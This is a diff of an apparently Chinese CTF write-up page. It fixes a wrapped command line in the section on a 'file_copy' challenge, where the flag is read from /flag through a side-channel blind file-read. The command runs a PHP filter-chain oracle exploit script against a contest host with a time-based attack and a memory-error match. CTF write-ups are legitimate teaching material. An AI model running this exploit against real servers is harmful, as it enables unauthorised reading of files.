@@ -297,8 +297,7 @@
 <hr>
 <h1 id="file-copy"><a href="#file-copy" class="headerlink" title="file_copy"></a>file_copy</h1><p>文件复制，支持伪协议，但是除了文件大小就没有其他回显，测出来 flag 在&#x2F;flag</p>
 <p>那明显是侧信道盲注</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> http://eci-2ze470339l9n5s7flrul.cloudeci1.ichunqiu.com/ <span class="token parameter variable">--parameter</span> path <span class="token parameter variable">--file</span> /flag <span class="token parameter variable">--time_based_atta</span>
-ck True <span class="token parameter variable">--match</span> <span class="token string">"Allowed memory size"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 filters_chain_oracle_exploit.py <span class="token parameter variable">--target</span> http://eci-2ze470339l9n5s7flrul.cloudeci1.ichunqiu.com/ <span class="token parameter variable">--parameter</span> path <span class="token parameter variable">--file</span> /flag <span class="token parameter variable">--time_based_attack</span> True <span class="token parameter variable">--match</span> <span class="token string">"Allowed memory size"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/blog/2025/01/17/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/image-20250117111643538.png" alt="image-20250117111643538"></p>
 <hr>
